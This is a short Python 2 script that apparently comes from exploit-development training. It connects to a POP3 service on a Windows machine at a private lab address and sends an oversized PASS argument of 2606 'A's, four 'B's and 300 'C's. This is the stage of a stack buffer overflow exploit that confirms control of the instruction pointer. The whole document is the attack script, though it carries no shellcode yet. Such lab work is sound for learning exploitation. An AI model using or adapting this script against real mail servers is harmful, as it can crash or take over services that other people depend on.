#!/usr/bin/python

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buffer = "A" * 2606 + "B" * 4 + "C" * 300

try: 
    print "\nSending buffer..."
# Connect to Windows machine, POP3 service    
    s.connect(('192.168.31.138',110))
    data = s.recv(1024)
    s.send('USER username' + '\r\n')
    data = s.recv(1024)
    s.send('PASS ' + buffer + '\r\n')
    print "\nDone!"

except:
    print "Could not connect!"
